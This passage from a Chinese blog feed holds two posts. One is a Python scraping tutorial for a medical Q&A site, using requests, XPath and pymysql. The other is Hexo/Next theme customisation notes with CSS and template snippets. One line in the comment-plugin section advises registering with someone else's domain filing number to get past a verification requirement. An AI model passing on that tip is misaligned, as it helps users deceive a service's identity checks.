]]></content>
      
        
        <tags>
            
            <tag> 摘录 </tag>
            
            <tag> pwn </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[爬虫初探-春雨医生网页数据收集]]></title>
      <url>/2017/12/04/study-pachong/</url>
      <content type="html"><![CDATA[<p><img src="/2017/12/04/study-pachong/1.jpg" alt=""><br>因为要帮八千棣的项目爬取春雨医生的网页数据，花了三天时间简单粗略的学习了一下爬虫资料并把爬到的数据存到了他的服务器上。</p>
<a id="more"></a>
<h1 id="针对网页的爬取"><a href="#针对网页的爬取" class="headerlink" title="针对网页的爬取"></a>针对网页的爬取</h1><p>对于网页的爬取，可以使用urllib2、request库等，这个大家很熟悉了，我这里用的是requests库。这里说一下我爬取时遇到的几个坑： </p>
<ol>
<li><p>使用request库爬取网页源码时出现报错信息：<br><img src="http://i4.bvimg.com/620384/f13f802ad6a291f5.png" alt=""><br>python解决SNIMissingWarning和InsecurePlatformWarning警告的方案：<br>打开cmd，输入</p>
<blockquote>
<p>pip install pyopenssl ndg-httpsclient pyasn1</p>
</blockquote>
</li>
<li><p>网页异步加载的处理方式<br>大部分网页都采用的是异步加载，浏览器显示的是使用js处理后的网页数据，而直接爬取得到的初始数据可能和我们想要的不太一样。这里我们把headers加上去就好了，f12查看一下浏览显示的头数据，这样就可以模拟浏览器访问显示渲染后的结果了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">def Getsource1(url):</span><br><span class="line">    headers = &#123;&apos;Host&apos;: &apos;www.chunyuyisheng.com&apos;,</span><br><span class="line">               &apos;User-Agent&apos;: &apos;Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0&apos;,</span><br><span class="line">               &apos;Accept&apos;: &apos;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&apos;,</span><br><span class="line">               &apos;Accept-Language&apos;: &apos;en-US,en;q=0.5&apos;,</span><br><span class="line">               &apos;Accept-Encoding&apos;: &apos;gzip, deflate&apos;,</span><br><span class="line">               &#125;</span><br><span class="line">    r = requests.get(url=url,headers=headers)</span><br><span class="line">    return r.text</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>或者使用表弟跟我说的selenium库，每次调用都会打开浏览器访问网址，这样就可以把加载完成后的网页源码爬取下来了，我觉得太暴力了，未果。</p>
<h1 id="解析库的选取"><a href="#解析库的选取" class="headerlink" title="解析库的选取"></a>解析库的选取</h1><h2 id="对于爬虫库BeautifulSoup和Xpath-主要是有以下几点区别"><a href="#对于爬虫库BeautifulSoup和Xpath-主要是有以下几点区别" class="headerlink" title="对于爬虫库BeautifulSoup和Xpath,主要是有以下几点区别:"></a>对于爬虫库BeautifulSoup和Xpath,主要是有以下几点区别:</h2><ul>
<li><p>写法不同。BeautifulSoup的使用主要针对自带的api函数，支持css选择器，而Xpath主要使用正则，同样的代码，两者写起来不太一样，Xpath明显要麻烦许多：</p>
<blockquote>
<p>title = soup.select(‘.content div.title h3’)<br>title = tree.xpath(“//<em>[@class=’content’]/div[@class=’content’]/h3”)<br>但是chrome浏览器支持复制<em>*选中元素</em></em>的xpath值，使得开发效率大大提高。<br><img src="http://i2.bvimg.com/620384/6b3fbd659fa95e4e.png" alt=""></p>
</blockquote>
</li>
<li><p>爬取效率不一样。BeautifulSoup和lxml的原理不一样，BeautifulSoup是基于DOM的，会载入整个文档，解析整个DOM树，因此时间和内存开销都会大很多。而lxml只会局部遍历，另外lxml是用c写的，而BeautifulSoup是用python写的，因此性能方面自然会差很多。</p>
</li>
<li><p>对新手的友好度，使用BeautifulSoup的话，要学好多它的功能函数，Xpath的话，入手简单，直接谷歌浏览器解决就好了</p>
</li>
</ul>
<p>针对以上几点区别，我最后选取了Xpath库来对我爬到的html数据作处理。</p>
<h2 id="Xpath的用法如下："><a href="#Xpath的用法如下：" class="headerlink" title="Xpath的用法如下："></a>Xpath的用法如下：</h2><h3>主要路径表达式：</h3><br><img src="http://i1.bvimg.com/620384/e5cdfb1c56249dd6.png" alt=""><br><br><h3>实例</h3>

<p>在下面的表格中，我们已列出了一些路径表达式以及表达式的结果：</p>
<p><img src="http://i1.bvimg.com/620384/b8402621e1881254.png" alt=""></p>
<h3>谓语（Predicates）</h3>

<p>谓语用来查找某个特定的节点或者包含某个指定的值的节点。<br>谓语被嵌在方括号中。</p>
<h3>实例</h3>

<p>在下面的表格中，我们列出了带有谓语的一些路径表达式，以及表达式的结果：</p>
<p><img src="http://i1.bvimg.com/620384/cf754fcf29fd481e.png" alt=""></p>
<h3>选取未知节点</h3>

<p>XPath 通配符可用来选取未知的 XML 元素。</p>
<p><img src="http://i1.bvimg.com/620384/d50f14df71eb4e03.png" alt=""></p>
<h3>实例</h3>

<p>在下面的表格中，我们列出了一些路径表达式，以及这些表达式的结果：</p>

<p><img src="http://i1.bvimg.com/620384/e4720cc3b6e2bc5b.png" alt=""></p>
<h3>选取若干路径</h3>

<p>通过在路径表达式中使用“|”运算符，您可以选取若干个路径。</p>
<h3>实例</h3>

<p>在下面的表格中，我们列出了一些路径表达式，以及这些表达式的结果：</p>
<p><img src="http://i1.bvimg.com/620384/de8aff83fe60dc46.png" alt=""></p>
<p>选取我在实际运用中的实例说明：<br><img src="http://i1.bvimg.com/620384/d0221be1834877c1.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">selectorill = etree.HTML(illhtml)</span><br><span class="line">xpathdetail=&apos;/html/body/div[4]/div[1]/div[1]/div[&apos;+str(i)+&apos;]/div/p/text() | /html/body/div[4]/div[1]/div[1]/div[&apos;+str(i)+&apos;]/div/p/a/text()&apos;  #选取p标签下的全部内容，因为中间有插入链接，所以使用&apos;&lt;p&gt;&apos;|&apos;&lt;p&gt;/a&apos;把链接的内容也加进去，text表示提取选择元素的文本内容，不包含再包含的标签内容。另外xpath解析时，遇到一个&lt;br&gt;算一个context</span><br><span class="line">contextill = selectorill.xpath(xpathdetail)</span><br><span class="line">text = &apos;&apos;</span><br><span class="line">for each in contextill:</span><br><span class="line">    text = text + each</span><br><span class="line">return text</span><br></pre></td></tr></table></figure></p>
<h1 id="数据库的处理"><a href="#数据库的处理" class="headerlink" title="数据库的处理"></a>数据库的处理</h1><p>数据库的处理我用的是mysql和pymysql库。</p>
<ul>
<li><p>连接数据库</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">def connectMysql():</span><br><span class="line">    conn = pymysql.connect(host=&apos;localhost&apos;,user=&apos;root&apos;,passwd=&apos;123456&apos;,db=&apos;cyys&apos;,charset=&apos;utf8&apos;)</span><br><span class="line">    return conn</span><br></pre></td></tr></table></figure>
</li>
<li><p>创建表</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">conn = connectMysql()</span><br><span class="line">cursor_create = conn.cursor()</span><br><span class="line">createTableSql = &quot;CREATE TABLE IF NOT EXISTS &quot; + createTableName + \</span><br><span class="line">                 &quot;(class_id INT NOT NULL AUTO_INCREMENT,\</span><br><span class="line">               ill_class VARCHAR(30) NOT NULL,\</span><br><span class="line">               ill_department VARCHAR(50) NOT NULL,\</span><br><span class="line">               PRIMARY KEY ( class_id ))&quot;</span><br><span class="line">cursor_create.execute(createTableSql)</span><br><span class="line">print (&apos;creat table &apos; + createTableName + &apos; successfully&apos;)</span><br><span class="line">conn.close()</span><br></pre></td></tr></table></figure>
</li>
<li><p>插入元素</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">conn = connectMysql()</span><br><span class="line">cursor = conn.cursor()</span><br><span class="line">insertContentSql = &quot;INSERT INTO  &quot; + insertTableName + &quot;(ill_class,ill_department)\</span><br><span class="line">        VALUES(%s,%s)&quot;</span><br><span class="line">cursor.execute(insertContentSql, (ill_class,ill_department))</span><br><span class="line">cursor.connection.commit()</span><br><span class="line">conn.close()</span><br><span class="line">print (&apos;insert contents to successfully&apos;)</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h1 id="爬取效果："><a href="#爬取效果：" class="headerlink" title="爬取效果："></a>爬取效果：</h1><p><img src="http://i1.bvimg.com/620384/4db0df0f5c2c1787.png" alt=""></p>
]]></content>
      
        
        <tags>
            
            <tag> 爬虫 </tag>
            
            <tag> Study </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Hexo-Next-折腾笔记]]></title>
      <url>/2017/11/30/hexo-all/</url>
      <content type="html"><![CDATA[<h1 id="Hexo环境搭建"><a href="#Hexo环境搭建" class="headerlink" title="Hexo环境搭建"></a>Hexo环境搭建</h1><p><img src="http://img.blog.csdn.net/20170810182823396?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvc3Vuc2hpbmU5NDAzMjY=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt=""><br>这两天终于把自己的博客搭建起来了，折腾了好多东西，总结一下。<br>关于利用hexo搭建博客的文章实在太多，这里就不再论述太多东西了，可以自行百度一下,这里提几个小点。  </p>
<a id="more"></a>
<h2 id="报错总结"><a href="#报错总结" class="headerlink" title="报错总结"></a>报错总结</h2><blockquote>
<p>ERROR Deployer not found: git 或者 ERROR Deployer not found: github<br>解决方法： npm install hexo-deployer-git –save<br>ERROR Process failed: layout/.DS_Store<br>解决方法： 进入主题里面layout和_partial目录下，使用删除命令：<br>rm-rf.DS_Store<br>ERROR Plugin load failed: hexo-server<br>解决方法： sudo npm install hexo-server<br>执行命令hexo server，提示：Usage: hexo ….<br>解决方法： npm install hexo-server –save  </p>
</blockquote>
<h2 id="hexo命令"><a href="#hexo命令" class="headerlink" title="hexo命令"></a>hexo命令</h2><p>每次部署的步骤，可按以下三步来进行。</p>
<ul>
<li>hexo clean       #清除缓存</li>
<li>hexo g           #生成静态页面至public目录</li>
<li>hexo s          #本地预览调试（localhost:4000【默认端口】，’ctrl + c’关闭server）</li>
<li>hexo d           #将.deploy目录部署到GitHub</li>
</ul>
<p>其他命令：</p>
<ul>
<li>hexo new”postName” #新建文章</li>
<li>hexo new page”pageName” #新建页面</li>
</ul>
<h2 id="环境选择"><a href="#环境选择" class="headerlink" title="环境选择"></a>环境选择</h2><p>github毕竟是国外的，速度比较慢。可以同时把博客部署到github和coding上，绑定域名的时候，国内访问设置为coding,国外是github<br>参考链接：<a href="http://blog.csdn.net/dengnanyi/article/details/53969684" target="_blank" rel="noopener">使用Github和Coding同时部署Hexo做博客</a><br><img src="http://7xqch5.com1.z0.glb.clouddn.com/hexo4_16.png" alt="">  </p>
<h2 id="主题选择"><a href="#主题选择" class="headerlink" title="主题选择"></a>主题选择</h2><ul>
<li><a href="https://www.zhihu.com/question/24422335" target="_blank" rel="noopener">有哪些好看的 Hexo 主题</a>  </li>
<li><a href="https://hexo.io/themes/" target="_blank" rel="noopener">Hexo所有主题</a></li>
</ul>
<h2 id="评论插件选择"><a href="#评论插件选择" class="headerlink" title="评论插件选择"></a>评论插件选择</h2><ol>
<li>disqus: 国外的，速度慢</li>
<li>友言: 支持QQ等社交软件登录，但是界面贼丑<br><img src="http://i1.bvimg.com/620384/3a6a7abf9a4c2956.png" alt=""></li>
<li>畅言: 和倒闭的多说差不多，需要手机验证码登录，注册的时候没有备案只能使用十五天，但是备案通过以后可以改域名，可以随便搜一个域名的备案信息注册，然后把域名改成自己的就可以了</li>
<li>gitment: 国外的，有github账号的人少</li>
<li>Valine: 韩国的，不需要登录，自己拟定昵称即可，缺点是手机端不能显示评论区<br><img src="https://ws1.sinaimg.cn/large/006qRazegy1fic2o9nuffj30tg0p60ty.jpg" alt=""></li>
<li>LiveRe: 韩国的，可以微信、QQ登录<br><img src="https://livere.com/img/title/img_title_intro_zh.png" alt=""></li>
</ol>
<h1 id="Next主题优化"><a href="#Next主题优化" class="headerlink" title="Next主题优化"></a>Next主题优化</h1><h2 id="添加动态背景"><a href="#添加动态背景" class="headerlink" title="添加动态背景"></a>添加动态背景</h2><p>打开 theme/next/_config.yml，修改其中内容</p>
<blockquote>
<p>#Canvas-nest<br>canvas_nest: true    漂浮线段效果</p>
<p>#three_waves<br>three_waves: false   波浪效果</p>
<p>#canvas_lines<br>canvas_lines: false  线条交叉效果</p>
<p>#canvas_sphere<br>canvas_sphere: false 球体效果</p>
</blockquote>
<h2 id="实现点击出现桃心效果"><a href="#实现点击出现桃心效果" class="headerlink" title="实现点击出现桃心效果"></a>实现点击出现桃心效果</h2><p><img src="http://upload-images.jianshu.io/upload_images/5308475-78e64c0a80bb559e.gif?imageMogr2/auto-orient/strip" alt="">  </p>
<p>在网址输入如下</p>
<blockquote>
<p><a href="http://7u2ss1.com1.z0.glb.clouddn.com/love.js" target="_blank" rel="noopener">http://7u2ss1.com1.z0.glb.clouddn.com/love.js</a>  </p>
</blockquote>
<p>然后将里面的代码copy一下，新建love.js文件并且将代码复制进去，然后保存。将love.js文件放到路径/themes/next/source/js/src里面，然后打开\themes\next\layout_layout.swig文件,在末尾（在前面引用会出现找不到的bug）添加以下代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 页面点击小红心 --&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/love.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<h2 id="修改文章内链接文本样式"><a href="#修改文章内链接文本样式" class="headerlink" title="修改文章内链接文本样式"></a>修改文章内链接文本样式</h2><p><img src="http://upload-images.jianshu.io/upload_images/5308475-8cc4fc18c399af7e.gif?imageMogr2/auto-orient/strip" alt="">  </p>
<p>具体实现方法<br>修改文件 themes\next\source\css_common\components\post\post.styl，在末尾添加如下css样式，：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// 文章内链接文本样式</span><br><span class="line">.post-body p a&#123;</span><br><span class="line">  color: #0593d3;</span><br><span class="line">  border-bottom: none;</span><br><span class="line">  border-bottom: 1px solid #0593d3;</span><br><span class="line">  &amp;:hover &#123;</span><br><span class="line">    color: #fc6423;</span><br><span class="line">    border-bottom: none;</span><br><span class="line">    border-bottom: 1px solid #fc6423;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中选择.post-body 是为了不影响标题，选择 p 是为了不影响首页“阅读全文”的显示样式,颜色可以自己定义。</p>
<h2 id="修改文章底部的那个带-号的标签"><a href="#修改文章底部的那个带-号的标签" class="headerlink" title="修改文章底部的那个带#号的标签"></a>修改文章底部的那个带#号的标签</h2><p><img src="http://upload-images.jianshu.io/upload_images/5308475-9f1817d2d7627f7a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="">  </p>
<p>具体实现方法<br>修改模板/themes/next/layout/_macro/post.swig，搜索 rel=”tag”&gt;#，将 # 换成<i class="fa fa-tag"></i></p>
<h2 id="在每篇文章末尾统一添加“本文结束”标记"><a href="#在每篇文章末尾统一添加“本文结束”标记" class="headerlink" title="在每篇文章末尾统一添加“本文结束”标记"></a>在每篇文章末尾统一添加“本文结束”标记</h2><p><img src="http://upload-images.jianshu.io/upload_images/5308475-90be73acbc5f8a7a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""><br>具体实现方法<br>在路径 \themes\next\layout_macro 中新建 passage-end-tag.swig 文件,并添加以下内容：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;div&gt;</span><br><span class="line">    &#123;% if not is_index %&#125;</span><br><span class="line">        &lt;div style=&quot;text-align:center;color: #ccc;font-size:14px;&quot;&gt;-------------本文结束&lt;i class=&quot;fa fa-paw&quot;&gt;&lt;/i&gt;感谢您的阅读-------------&lt;/div&gt;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure>
<p>接着打开\themes\next\layout_macro\post.swig文件，在post-body 之后， post-footer 之前添加如下画红色部分代码（post-footer之前两个DIV）：  </p>
<p><img src="http://upload-images.jianshu.io/upload_images/5308475-865c7f94f89b907e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="">  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;div&gt;</span><br><span class="line">  &#123;% if not is_index %&#125;</span><br><span class="line">    &#123;% include &apos;passage-end-tag.swig&apos; %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure>
<p>然后打开主题配置文件（_config.yml),在末尾添加：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#文章末尾添加“本文结束”标记</span><br><span class="line">passage_end_tag:</span><br><span class="line">  enabled: true</span><br></pre></td></tr></table></figure>
<p>完成以上设置之后，在每篇文章之后都会添加如上效果图的样子。</p>
<h2 id="修改作者头像并旋转"><a href="#修改作者头像并旋转" class="headerlink" title="修改作者头像并旋转"></a>修改作者头像并旋转</h2><p><img src="http://i4.bvimg.com/620384/0ae8ac3cce5980f0.gif" alt="">  </p>
<p>打开\themes\next\source\css_common\components\sidebar\sidebar-author.styl，在里面添加如下代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">.site-author-image &#123;</span><br><span class="line">  display: block;</span><br><span class="line">  margin: 0 auto;</span><br><span class="line">  padding: $site-author-image-padding;</span><br><span class="line">  max-width: $site-author-image-width;</span><br><span class="line">  height: $site-author-image-height;</span><br><span class="line">  border: $site-author-image-border-width solid $site-author-image-border-color;</span><br><span class="line"></span><br><span class="line">  /* 头像圆形 */</span><br><span class="line">  border-radius: 80px;</span><br><span class="line">  -webkit-border-radius: 80px;</span><br><span class="line">  -moz-border-radius: 80px;</span><br><span class="line">  box-shadow: inset 0 -1px 0 #333sf;</span><br><span class="line"></span><br><span class="line">  /* 设置循环动画 [animation: (play)动画名称 (2s)动画播放时长单位秒或微秒 (ase-out)动画播放的速度曲线为以低速结束 </span><br><span class="line">    (1s)等待1秒然后开始动画 (1)动画播放次数(infinite为循环播放) ]*/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  /* 鼠标经过头像旋转360度 */</span><br><span class="line">  -webkit-transition: -webkit-transform 1.0s ease-out;</span><br><span class="line">  -moz-transition: -moz-transform 1.0s ease-out;</span><br><span class="line">  transition: transform 1.0s ease-out;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">img:hover &#123;</span><br><span class="line">  /* 鼠标经过停止头像旋转 </span><br><span class="line">  -webkit-animation-play-state:paused;</span><br><span class="line">  animation-play-state:paused;*/</span><br><span class="line"></span><br><span class="line">  /* 鼠标经过头像旋转360度 */</span><br><span class="line">  -webkit-transform: rotateZ(360deg);</span><br><span class="line">  -moz-transform: rotateZ(360deg);</span><br><span class="line">  transform: rotateZ(360deg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/* Z 轴旋转动画 */</span><br><span class="line">@-webkit-keyframes play &#123;</span><br><span class="line">  0% &#123;</span><br><span class="line">    -webkit-transform: rotateZ(0deg);</span><br><span class="line">  &#125;</span><br><span class="line">  100% &#123;</span><br><span class="line">    -webkit-transform: rotateZ(-360deg);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">@-moz-keyframes play &#123;</span><br><span class="line">  0% &#123;</span><br><span class="line">    -moz-transform: rotateZ(0deg);</span><br><span class="line">  &#125;</span><br><span class="line">  100% &#123;</span><br><span class="line">    -moz-transform: rotateZ(-360deg);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">@keyframes play &#123;</span><br><span class="line">  0% &#123;</span><br><span class="line">    transform: rotateZ(0deg);</span><br><span class="line">  &#125;</span><br><span class="line">  100% &#123;</span><br><span class="line">    transform: rotateZ(-360deg);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="修改“代码块自定义样式"><a href="#修改“代码块自定义样式" class="headerlink" title="修改“代码块自定义样式"></a>修改“代码块自定义样式</h2><p><img src="http://upload-images.jianshu.io/upload_images/5308475-e83a6ac00d4d1db3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="">  </p>
<p>具体实现方法<br>打开\themes\next\source\css_custom\custom.styl,向里面加入：(颜色可以自己定义)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">// Custom styles.</span><br><span class="line">code &#123;</span><br><span class="line">    color: #ff7600;</span><br><span class="line">    background: #fbf7f8;</span><br><span class="line">    margin: 2px;</span><br><span class="line">&#125;</span><br><span class="line">// 大代码块的自定义样式</span><br><span class="line">.highlight, pre &#123;</span><br><span class="line">    margin: 5px 0;</span><br><span class="line">    padding: 5px;</span><br><span class="line">    border-radius: 3px;</span><br><span class="line">&#125;</span><br><span class="line">.highlight, code, pre &#123;</span><br><span class="line">    border: 1px solid #d6d6d6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="侧边栏社交小图标设置"><a href="#侧边栏社交小图标设置" class="headerlink" title="侧边栏社交小图标设置"></a>侧边栏社交小图标设置</h2><p><img src="http://upload-images.jianshu.io/upload_images/5308475-20e8bba1ad3b343f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="">  </p>
<p>具体实现方法<br>打开主题配置文件（_config.yml），搜索social_icons:,在<a href="http://fontawesome.io/icons/" target="_blank" rel="noopener">图标库</a>找自己喜欢的小图标，并将名字复制在如下位置，保存即可（||后面跟的是图标名字）</p>
<h2 id="添加头部背景图片"><a href="#添加头部背景图片" class="headerlink" title="添加头部背景图片"></a>添加头部背景图片</h2><p><img src="http://i2.bvimg.com/620384/e689b7fcfed6bf83.png" alt="">  </p>
<p>具体实现方法<br>打开 source/css/_common/components/header/header.styl，代码修改为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.header &#123; background-image: url(&quot;图片链接&quot;); &#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.header-inner &#123; position: relative; &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@import &quot;headerband&quot;;</span><br><span class="line">@import &quot;site-meta&quot;;</span><br><span class="line">@import &quot;site-nav&quot;;</span><br><span class="line">@import &quot;menu&quot;;</span><br></pre></td></tr></table></figure>
<h2 id="主页文章添加阴影效果"><a href="#主页文章添加阴影效果" class="headerlink" title="主页文章添加阴影效果"></a>主页文章添加阴影效果</h2><p><img src="http://i2.bvimg.com/620384/0e6b208b56d93533.png" alt="">  </p>
<p>具体实现方法<br>打开\themes\next\source\css_custom\custom.styl,向里面加入：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// 主页文章添加阴影效果</span><br><span class="line"> .post &#123;</span><br><span class="line">   margin-top: 60px;</span><br><span class="line">   margin-bottom: 60px;</span><br><span class="line">   padding: 25px;</span><br><span class="line">   -webkit-box-shadow: 0 0 5px rgba(202, 203, 203, .5);</span><br><span class="line">   -moz-box-shadow: 0 0 5px rgba(202, 203, 204, .5);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<h2 id="在网站底部加上访问量"><a href="#在网站底部加上访问量" class="headerlink" title="在网站底部加上访问量"></a>在网站底部加上访问量</h2><p><img src="http://i2.bvimg.com/620384/149d5277202442d0.png" alt="">  </p>
<p>具体实现方法<br>打开\themes\next\layout_partials\footer.swig文件,在copyright前加上画红线这句话：  </p>
<p><img src="http://upload-images.jianshu.io/upload_images/5308475-ef8a4643f33fbaa1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="">  </p>
<p>代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;script async src=&quot;https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">``` </span><br><span class="line"></span><br><span class="line">然后再合适的位置添加显示统计的代码，如图：  </span><br><span class="line"></span><br><span class="line">![](http://upload-images.jianshu.io/upload_images/5308475-bd6fb55b6847d13a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)  </span><br><span class="line"></span><br><span class="line">代码如下：</span><br></pre></td></tr></table></figure>
<p><div class="powered-by"><br><i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv"><br>  本站访客数:<span id="busuanzi_value_site_uv"></span><br></span><br></div><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">在这里有两中不同计算方式的统计代码：</span><br><span class="line">pv的方式，单个用户连续点击n篇文章，记录n次访问量</span><br></pre></td></tr></table></figure></p>
<p><span id="busuanzi_container_site_pv"><br>    本站总访问量<span id="busuanzi_value_site_pv"></span>次<br></span><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">uv的方式，单个用户连续点击n篇文章，只记录1次访客数</span><br></pre></td></tr></table></figure></p>
<p><span id="busuanzi_container_site_uv"><br>  本站总访问量<span id="busuanzi_value_site_uv"></span>次<br></span><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">添加之后再执行hexo d -g，然后再刷新页面就能看到效果</span><br><span class="line"></span><br><span class="line">## 网站底部字数统计</span><br><span class="line">具体方法实现</span><br><span class="line">切换到根目录下，然后运行如下代码</span><br><span class="line"></span><br><span class="line">&gt;$ npm install 